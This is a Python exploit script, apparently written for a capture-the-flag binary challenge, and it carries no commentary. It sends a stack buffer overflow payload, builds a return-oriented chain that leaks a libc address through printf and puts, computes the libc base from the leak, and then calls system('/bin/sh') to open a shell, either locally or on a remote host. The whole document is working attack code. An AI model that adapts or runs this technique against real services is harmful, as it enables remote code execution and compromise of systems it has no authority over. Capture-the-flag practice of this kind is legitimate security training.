#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*main+145
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input("Please press ENTER to send your payload")

# ==================== EXPLOIT ====================

input()
def exploit():

  ret = 0x000000000040101a

  pl = flat(

    b'\0' + b'A'*71,
    ret,
    exe.plt.printf,
    exe.plt.puts,
    exe.sym.main,
    )

  sla(b'Data: ', pl)
  ru(b'Thank for playing :)\n')
  leak = u64(rl()[:-1].ljust(0x8, b'\0'))
  libc.address = leak - 0x62050
  print(hex(leak))
  print(hex(libc.address))

  rop = ROP(libc)
  pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

  pl = flat(
    b'\0' + b'A'*71,
    ret,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym.system
    )

  sla(b'Data: ', pl)

  interactive()

if __name__ == '__main__':
  exploit()


